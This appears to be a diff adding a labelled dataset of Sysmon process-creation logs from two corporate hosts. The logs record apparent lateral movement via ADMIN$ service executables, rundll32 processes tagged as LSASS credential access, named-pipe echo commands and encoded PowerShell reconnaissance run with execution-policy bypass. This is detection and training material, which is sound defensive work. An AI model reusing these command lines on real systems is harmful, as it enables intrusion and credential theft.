+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:26:26.293062200Z""/>
+    <EventRecordID>194306</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1960""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-04.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:26:26.293</Data>
+    <Data Name=""ProcessGuid"">{0EBA84BE-9912-62ED-0000-0010B3C2EF01}</Data>
+    <Data Name=""ProcessId"">4264</Data>
+    <Data Name=""Image"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
+    <Data Name=""FileVersion"">?</Data>
+    <Data Name=""Description"">?</Data>
+    <Data Name=""Product"">?</Data>
+    <Data Name=""Company"">?</Data>
+    <Data Name=""CommandLine"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{0EBA84BE-647E-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=EB1EF2CC4520FB57C1F73817E7261BC6,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
+    <Data Name=""ParentProcessGuid"">{0EBA84BE-647E-62ED-0000-001032920000}</Data>
+    <Data Name=""ParentProcessId"">484</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
+  </EventData>
+</Event>
+",4264,484,\\ACC-04\ADMIN$\42f7d05.exe,C:\Windows\System32\services.exe,\\ACC-04\ADMIN$\42f7d05.exe,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:26:27+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:26:27.325696400Z""/>
+    <EventRecordID>194314</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1960""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-04.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:26:27.322</Data>
+    <Data Name=""ProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
+    <Data Name=""ProcessId"">4092</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{0EBA84BE-647E-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
+    <Data Name=""ParentProcessGuid"">{0EBA84BE-9912-62ED-0000-0010B3C2EF01}</Data>
+    <Data Name=""ParentProcessId"">4264</Data>
+    <Data Name=""ParentImage"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
+    <Data Name=""ParentCommandLine"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
+  </EventData>
+</Event>
+",4092,4264,C:\Windows\SysWOW64\rundll32.exe,\\ACC-04\ADMIN$\42f7d05.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
+2022-08-05 22:28:02+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:28:02.346602500Z""/>
+    <EventRecordID>194641</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1960""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-04.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:28:02.330</Data>
+    <Data Name=""ProcessGuid"">{0EBA84BE-9972-62ED-0000-001017C1F201}</Data>
+    <Data Name=""ProcessId"">4300</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{0EBA84BE-647E-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
+    <Data Name=""ParentProcessId"">4092</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4300,4092,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:28:03+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:28:03.077367400Z""/>
+    <EventRecordID>194645</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1960""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-04.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:28:03.077</Data>
+    <Data Name=""ProcessGuid"">{0EBA84BE-9973-62ED-0000-0010BFC9F201}</Data>
+    <Data Name=""ProcessId"">4952</Data>
+    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
+    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+    <Data Name=""Description"">Windows Command Processor</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo 2b34c792c33 &gt; \\.\pipe\fee489</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{0EBA84BE-9973-62ED-0000-002068C9F201}</Data>
+    <Data Name=""LogonId"">0x0000000001f2c968</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
+    <Data Name=""ParentProcessGuid"">{0EBA84BE-9972-62ED-0000-001017C1F201}</Data>
+    <Data Name=""ParentProcessId"">4300</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4952,4300,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo 2b34c792c33 &gt; \\.\pipe\fee489,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:29:38+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:29:38.921359700Z""/>
+    <EventRecordID>195144</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1960""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-04.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:29:38.905</Data>
+    <Data Name=""ProcessGuid"">{0EBA84BE-99D2-62ED-0000-0010D03EF701}</Data>
+    <Data Name=""ProcessId"">3736</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{0EBA84BE-9973-62ED-0000-002068C9F201}</Data>
+    <Data Name=""LogonId"">0x0000000001f2c968</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
+    <Data Name=""ParentProcessId"">4092</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",3736,4092,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:30:33+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:30:33.638360900Z""/>
+    <EventRecordID>195500</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1440"" ThreadID=""1960""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-04.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:30:33.607</Data>
+    <Data Name=""ProcessGuid"">{0EBA84BE-9A09-62ED-0000-00100C0B0302}</Data>
+    <Data Name=""ProcessId"">1264</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{0EBA84BE-9973-62ED-0000-002068C9F201}</Data>
+    <Data Name=""LogonId"">0x0000000001f2c968</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
+    <Data Name=""ParentProcessId"">4092</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",1264,4092,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:31:36+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:31:36.502307900Z""/>
+    <EventRecordID>177563</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1472"" ThreadID=""2036""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-02.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:31:35.901</Data>
+    <Data Name=""ProcessGuid"">{BEDB1A18-9A47-62ED-0000-00100C1CE701}</Data>
+    <Data Name=""ProcessId"">4496</Data>
+    <Data Name=""Image"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
+    <Data Name=""FileVersion"">?</Data>
+    <Data Name=""Description"">?</Data>
+    <Data Name=""Product"">?</Data>
+    <Data Name=""Company"">?</Data>
+    <Data Name=""CommandLine"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{BEDB1A18-644A-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=C7F7C90E47C5E24FECC19CCEF2EC820F,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
+    <Data Name=""ParentProcessGuid"">{BEDB1A18-644A-62ED-0000-00103A940000}</Data>
+    <Data Name=""ParentProcessId"">500</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
+  </EventData>
+</Event>
+",4496,500,\\ACC-02\ADMIN$\b9b362b.exe,C:\Windows\System32\services.exe,\\ACC-02\ADMIN$\b9b362b.exe,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:31:38+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:31:38.343515500Z""/>
+    <EventRecordID>177608</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1472"" ThreadID=""2036""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-02.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:31:38.265</Data>
+    <Data Name=""ProcessGuid"">{BEDB1A18-9A4A-62ED-0000-0010B685E701}</Data>
+    <Data Name=""ProcessId"">4776</Data>
+    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{BEDB1A18-644A-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
+    <Data Name=""ParentProcessGuid"">{BEDB1A18-9A47-62ED-0000-00100C1CE701}</Data>
+    <Data Name=""ParentProcessId"">4496</Data>
+    <Data Name=""ParentImage"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
+    <Data Name=""ParentCommandLine"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
+  </EventData>
+</Event>
+",4776,4496,C:\Windows\SysWOW64\rundll32.exe,\\ACC-02\ADMIN$\b9b362b.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
+2022-08-05 22:32:34+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:32:34.805069600Z""/>
+    <EventRecordID>178026</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1472"" ThreadID=""2036""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-02.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:32:34.805</Data>
+    <Data Name=""ProcessGuid"">{BEDB1A18-9A82-62ED-0000-00108FA6EB01}</Data>
+    <Data Name=""ProcessId"">2004</Data>
+    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+    <Data Name=""Description"">Windows host process (Rundll32)</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{BEDB1A18-644A-62ED-0000-0020E7030000}</Data>
+    <Data Name=""LogonId"">0x00000000000003e7</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
+    <Data Name=""ParentProcessGuid"">{BEDB1A18-9A4A-62ED-0000-0010B685E701}</Data>
+    <Data Name=""ParentProcessId"">4776</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",2004,4776,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
+2022-08-05 22:32:35+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:32:35.535790500Z""/>
+    <EventRecordID>178030</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1472"" ThreadID=""2036""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-02.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:32:35.535</Data>
+    <Data Name=""ProcessGuid"">{BEDB1A18-9A83-62ED-0000-0010FAAEEB01}</Data>
+    <Data Name=""ProcessId"">3928</Data>
+    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
+    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+    <Data Name=""Description"">Windows Command Processor</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo 1c28e620d06 &gt; \\.\pipe\8498ca</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{BEDB1A18-9A83-62ED-0000-0020A3AEEB01}</Data>
+    <Data Name=""LogonId"">0x0000000001ebaea3</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
+    <Data Name=""ParentProcessGuid"">{BEDB1A18-9A82-62ED-0000-00108FA6EB01}</Data>
+    <Data Name=""ParentProcessId"">2004</Data>
+    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
+  </EventData>
+</Event>
+",3928,2004,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo 1c28e620d06 &gt; \\.\pipe\8498ca,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:33:13+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:33:13.293684600Z""/>
+    <EventRecordID>178084</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1472"" ThreadID=""2036""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-02.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:33:13.293</Data>
+    <Data Name=""ProcessGuid"">{BEDB1A18-9AA9-62ED-0000-0010B2E2EB01}</Data>
+    <Data Name=""ProcessId"">1288</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{BEDB1A18-9A83-62ED-0000-0020A3AEEB01}</Data>
+    <Data Name=""LogonId"">0x0000000001ebaea3</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{BEDB1A18-9A4A-62ED-0000-0010B685E701}</Data>
+    <Data Name=""ParentProcessId"">4776</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",1288,4776,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:34:02+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:34:02.560209800Z""/>
+    <EventRecordID>178173</EventRecordID>
+    <Correlation/>
